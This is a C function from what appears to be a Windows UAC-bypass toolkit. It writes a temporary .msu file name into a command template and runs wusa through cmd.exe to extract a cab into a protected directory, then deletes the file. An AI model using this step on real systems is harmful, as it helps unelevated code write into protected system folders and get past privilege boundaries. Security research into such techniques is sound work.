/*
* ucmWusaExtractPackage
*
* Purpose:
*
* Extract cab to protected directory using wusa.
*
*/
BOOL ucmWusaExtractPackage(
    LPWSTR lpCommandLine
    )
{
    BOOL bResult = FALSE;
    WCHAR szMsuFileName[MAX_PATH * 2];
    WCHAR szCmd[MAX_PATH * 4];

    RtlSecureZeroMemory(szMsuFileName, sizeof(szMsuFileName));
    _strcpy(szMsuFileName, g_ctx.szTempDirectory);
    _strcat(szMsuFileName, ELLOCNAK_MSU);

    //extract msu data to target directory
    RtlSecureZeroMemory(szCmd, sizeof(szCmd));
    wsprintfW(szCmd, lpCommandLine, szMsuFileName);
    bResult = supRunProcess(L"cmd.exe", szCmd);

    if (szMsuFileName[0] != 0) {
        DeleteFileW(szMsuFileName);
    }
    return bResult;
}